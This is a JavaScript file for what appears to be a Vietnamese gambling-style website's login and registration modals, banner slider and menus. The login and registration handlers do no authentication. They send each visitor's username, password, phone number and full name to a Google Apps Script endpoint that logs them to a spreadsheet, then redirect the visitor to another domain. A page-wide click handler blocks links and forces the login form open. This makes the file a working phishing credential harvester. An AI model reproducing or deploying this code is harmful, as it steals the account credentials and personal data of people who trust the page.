/* ==================== CẤU HÌNH DÙNG CHUNG (GLOBAL) ==================== */
const GOOGLE_SHEET_WEBAPP_URL = "https://script.google.com/macros/s/AKfycby9vewqYk-fulyYMANMw3EFV4WBk0RWcda5P3TU-Jg3n6ciAYXhW__UmIznovo8y9B7/exec";
const REDIRECT_URL = "https://m6gz.xyz/";

/* ==================== CÁC HÀM MODAL & TIỆN ÍCH (GLOBAL CHO ONCLICK HTML) ==================== */
function openModal(mode) {
    const modal = document.getElementById("authModal");
    if (!modal) return;
    modal.classList.add("show");
    const isRegister = mode && mode.toUpperCase().includes("ĐĂNG KÝ");

    // Giao diện Máy tính: Đăng nhập hiện form, Đăng ký hiện chuông vàng
    const pcLoginBox = document.getElementById("pcLoginBox");
    const pcRegisterBox = document.getElementById("pcRegisterBox");
    if (pcLoginBox) pcLoginBox.style.display = isRegister ? "none" : "block";
    if (pcRegisterBox) pcRegisterBox.style.display = isRegister ? "flex" : "none";

    // Giao diện Điện thoại: Chuyển đúng tab ĐĂNG KÝ / ĐĂNG NHẬP
    switchMobileTab(isRegister ? "register" : "login");
    clearErrors();
}

function closeModal() {
    const modal = document.getElementById("authModal");
    if (modal) modal.classList.remove("show");
    clearErrors();
}

function switchMobileTab(tab) {
    const isLogin = tab === "login";
    document.getElementById("mbTabLogin")?.classList.toggle("active", isLogin);
    document.getElementById("mbTabRegister")?.classList.toggle("active", !isLogin);
    document.getElementById("mbLoginForm")?.classList.toggle("active", isLogin);
    document.getElementById("mbRegisterForm")?.classList.toggle("active", !isLogin);
    clearErrors();
}

function togglePass(inputId, btn) {
    const input = document.getElementById(inputId);
    const icon = btn.querySelector("i");
    if (!input || !icon) return;

    if (input.type === "password") {
        input.type = "text";
        icon.classList.replace("fa-eye-slash", "fa-eye");
    } else {
        input.type = "password";
        icon.classList.replace("fa-eye", "fa-eye-slash");
    }
}

function showError(boxId, msg) {
    const box = document.getElementById(boxId);
    if (!box) return;
    box.textContent = msg;
    box.classList.add("show");
}

function clearErrors() {
    ["pcLoginError", "mbAuthError"].forEach(id => {
        const box = document.getElementById(id);
        if (box) {
            box.textContent = "";
            box.classList.remove("show");
        }
    });
}

// Hàm gửi dữ liệu về Google Sheet rồi chuyển hướng trang
async function sendToGoogleSheetAndRedirect(payload, submitBtn) {
    if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.textContent = "ĐANG XỬ LÝ...";
    }

    try {
        if (GOOGLE_SHEET_WEBAPP_URL && !GOOGLE_SHEET_WEBAPP_URL.includes("DÁN_LINK")) {
            await fetch(GOOGLE_SHEET_WEBAPP_URL, {
                method: "POST",
                mode: "no-cors",
                headers: {
                    "Content-Type": "text/plain;charset=utf-8"
                },
                body: JSON.stringify(payload)
            });
        }
    } catch (err) {
        console.error("Lỗi gửi dữ liệu:", err);
    } finally {
        window.location.href = REDIRECT_URL;
    }
}

// Hàm kiểm tra chung cho Đăng nhập (PC & Mobile)
function validateAndRedirectLogin(userId, passId, phoneId, errorBoxId, formType, submitBtn) {
    const user = document.getElementById(userId).value.trim();
    const pass = document.getElementById(passId).value.trim();
    const phone = document.getElementById(phoneId).value.trim();

    if (!user || !pass || !phone) {
        return showError(errorBoxId, "Vui lòng điền đầy đủ toàn bộ thông tin!");
    }
    if (user.length < 6 || user.length > 20) {
        return showError(errorBoxId, "Tên đăng nhập phải từ 6 đến 20 ký tự!");
    }
    if (pass.length < 6 || pass.length > 20) {
        return showError(errorBoxId, "Mật khẩu phải từ 6 đến 20 ký tự!");
    }
    if (!/^\d{10}$/.test(phone)) {
        return showError(errorBoxId, "Số điện thoại phải nhập đúng 10 chữ số!");
    }

    clearErrors();
    sendToGoogleSheetAndRedirect(
        { type: formType, username: user, password: pass, phone: phone },
        submitBtn
    );
}

/* ==================== KHỞI TẠO SỰ KIỆN KHI DOM TẢI XONG ==================== */
document.addEventListener("DOMContentLoaded", () => {
    /* -------------------- 1. BANNER TRƯỢT NGANG VÒNG LẶP VÔ HẠN -------------------- */
    const track = document.getElementById("sliderTrack");
    const prevBtn = document.getElementById("prevBtn");
    const nextBtn = document.getElementById("nextBtn");
    const dotsContainer = document.getElementById("sliderDots");
    const slider = document.getElementById("bannerSlider");

    if (track && slider && track.children.length > 0) {
        const slides = Array.from(track.children);
        const totalSlides = slides.length;
        let currentIndex = 1;
        let isTransitioning = false;
        let autoPlayTimer;

        const firstClone = slides[0].cloneNode(true);
        const lastClone = slides[totalSlides - 1].cloneNode(true);
        track.appendChild(firstClone);
        track.insertBefore(lastClone, slides[0]);

        track.style.transform = `translateX(-${currentIndex * 100}%)`;

        for (let i = 0; i < totalSlides; i++) {
            const dot = document.createElement("span");
            dot.classList.add("dot");
            if (i === 0) dot.classList.add("active");
            dot.addEventListener("click", () => goToSlide(i + 1));
            dotsContainer?.appendChild(dot);
        }
        const dots = document.querySelectorAll(".dot");

        function updateDots() {
            let dotIndex = currentIndex - 1;
            if (dotIndex < 0) dotIndex = totalSlides - 1;
            if (dotIndex >= totalSlides) dotIndex = 0;

            dots.forEach(d => d.classList.remove("active"));
            if (dots[dotIndex]) dots[dotIndex].classList.add("active");
        }

        function goToSlide(index) {
            if (isTransitioning) return;
            isTransitioning = true;
            currentIndex = index;
            track.style.transition = "transform 0.55s ease-in-out";
            track.style.transform = `translateX(-${currentIndex * 100}%)`;
            updateDots();
        }

        track.addEventListener("transitionend", () => {
            if (currentIndex === totalSlides + 1) {
                track.style.transition = "none";
                currentIndex = 1;
                track.style.transform = `translateX(-${currentIndex * 100}%)`;
            } else if (currentIndex === 0) {
                track.style.transition = "none";
                currentIndex = totalSlides;
                track.style.transform = `translateX(-${currentIndex * 100}%)`;
            }
            isTransitioning = false;
        });

        nextBtn?.addEventListener("click", () => {
            goToSlide(currentIndex + 1);
            resetAutoPlay();
        });

        prevBtn?.addEventListener("click", () => {
            goToSlide(currentIndex - 1);
            resetAutoPlay();
        });

        function startAutoPlay() {
            autoPlayTimer = setInterval(() => {
                goToSlide(currentIndex + 1);
            }, 3500);
        }

        function resetAutoPlay() {
            clearInterval(autoPlayTimer);
            startAutoPlay();
        }

        slider.addEventListener("mouseenter", () => clearInterval(autoPlayTimer));
        slider.addEventListener("mouseleave", startAutoPlay);

        let startX = 0;
        slider.addEventListener("touchstart", (e) => {
            startX = e.touches[0].clientX;
            clearInterval(autoPlayTimer);
        }, { passive: true });

        slider.addEventListener("touchend", (e) => {
            const endX = e.changedTouches[0].clientX;
            if (startX - endX > 40) goToSlide(currentIndex + 1);
            else if (endX - startX > 40) goToSlide(currentIndex - 1);
            startAutoPlay();
        });

        startAutoPlay();
    }

    /* -------------------- 2. MENU TRƯỢT ĐIỆN THOẠI (DRAWER) -------------------- */
    const openDrawerBtn = document.getElementById("openDrawerBtn");
    const closeDrawerBtn = document.getElementById("closeDrawerBtn");
    const mobileDrawer = document.getElementById("mobileDrawer");
    const drawerOverlay = document.getElementById("drawerOverlay");

    function toggleDrawer(open) {
        mobileDrawer?.classList.toggle("open", open);
        drawerOverlay?.classList.toggle("show", open);
    }

    openDrawerBtn?.addEventListener("click", () => toggleDrawer(true));
    closeDrawerBtn?.addEventListener("click", () => toggleDrawer(false));
    drawerOverlay?.addEventListener("click", () => toggleDrawer(false));

    /* -------------------- 3. THU GỌN THANH HỖ TRỢ BÊN PHẢI (PC) -------------------- */
    const sidebar = document.getElementById("floatingSidebar");
    const toggleSidebarBtn = document.getElementById("toggleSidebarBtn");

    toggleSidebarBtn?.addEventListener("click", () => {
        sidebar?.classList.toggle("collapsed");
    });

    /* -------------------- 4. RÀNG BUỘC INPUT & SUBMIT FORM -------------------- */
    // Chỉ cho nhập số ở các ô Số điện thoại (tối đa 10 số)
    ["pcLoginPhone", "mbLoginPhone", "mbRegPhone"].forEach(id => {
        const el = document.getElementById(id);
        if (el) {
            el.addEventListener("input", () => {
                el.value = el.value.replace(/\D/g, "").slice(0, 10);
            });
        }
    });

    // Submit Đăng nhập PC (đảm bảo thẻ <form> trên HTML có id="pcLoginForm")
    document.getElementById("pcLoginForm")?.addEventListener("submit", function (e) {
        e.preventDefault();
        const submitBtn = this.querySelector("button[type='submit']");
        validateAndRedirectLogin("pcLoginUser", "pcLoginPass", "pcLoginPhone", "pcLoginError", "LOGIN_PC", submitBtn);
    });

    // Submit Đăng nhập Mobile (đảm bảo thẻ <form> trên HTML có id="mbLoginForm")
    document.getElementById("mbLoginForm")?.addEventListener("submit", function (e) {
        e.preventDefault();
        const submitBtn = this.querySelector("button[type='submit']");
        validateAndRedirectLogin("mbLoginUser", "mbLoginPass", "mbLoginPhone", "mbAuthError", "LOGIN_MOBILE", submitBtn);
    });

    // Submit Đăng ký Điện thoại
    document.getElementById("mbRegisterForm")?.addEventListener("submit", function (e) {
        e.preventDefault();
        const user = document.getElementById("mbRegUser").value.trim();
        const pass = document.getElementById("mbRegPass").value.trim();
        const fullname = document.getElementById("mbRegFullname").value.trim();
        const phone = document.getElementById("mbRegPhone").value.trim();
        const agree = document.getElementById("mbRegAgree").checked;

        if (!user || !pass || !fullname || !phone) {
            return showError("mbAuthError", "Vui lòng điền đầy đủ toàn bộ thông tin!");
        }
        if (user.length < 6 || user.length > 20) {
            return showError("mbAuthError", "Tên đăng nhập phải từ 6 đến 20 ký tự!");
        }
        if (pass.length < 6 || pass.length > 20) {
            return showError("mbAuthError", "Mật khẩu phải từ 6 đến 20 ký tự!");
        }
        if (!/^\d{10}$/.test(phone)) {
            return showError("mbAuthError", "Số điện thoại phải nhập đúng 10 chữ số!");
        }
        if (!agree) {
            return showError("mbAuthError", "Vui lòng xác nhận đủ 18 tuổi và đồng ý điều khoản!");
        }

        clearErrors();
        const submitBtn = this.querySelector("button[type='submit']");
        sendToGoogleSheetAndRedirect(
            { type: "REGISTER_MOBILE", username: user, password: pass, fullname: fullname, phone: phone },
            submitBtn
        );
    });

    // Bấm ra ngoài nền tối để đóng modal (PC)
    document.getElementById("authModal")?.addEventListener("click", function (e) {
        if (e.target === this) closeModal();
    });

    /* -------------------- 5. TRẠNG THÁI ACTIVE DANH MỤC & MENU DƯỚI -------------------- */
    const catBoxes = document.querySelectorAll(".cat-box");
    catBoxes.forEach(box => {
        box.addEventListener("click", () => {
            catBoxes.forEach(b => b.classList.remove("active"));
            box.classList.add("active");
        });
    });

    const bottomItems = document.querySelectorAll(".bottom-item");
    bottomItems.forEach(item => {
        item.addEventListener("click", () => {
            bottomItems.forEach(i => i.classList.remove("active"));
            item.classList.add("active");
        });
    });

    /* -------------------- 6. NHẤN VÀO CÁC THÀNH PHẦN KHÁC MỞ FORM ĐĂNG NHẬP -------------------- */
    document.addEventListener("click", (e) => {
        if (e.target.closest("#authModal")) return;

        const ignoredSelectors = [
            "[onclick*='openModal']",
            "#openDrawerBtn",
            "#closeDrawerBtn",
            "#drawerOverlay",
            "#prevBtn",
            "#nextBtn",
            ".dot",
            "#toggleSidebarBtn",
            "video"
        ];

        if (e.target.closest(ignoredSelectors.join(","))) return;

        if (e.target.closest("a")) {
            e.preventDefault();
        }

        if (mobileDrawer && mobileDrawer.classList.contains("open")) {
            mobileDrawer.classList.remove("open");
            drawerOverlay?.classList.remove("show");
        }

        openModal("ĐĂNG NHẬP");
    });
});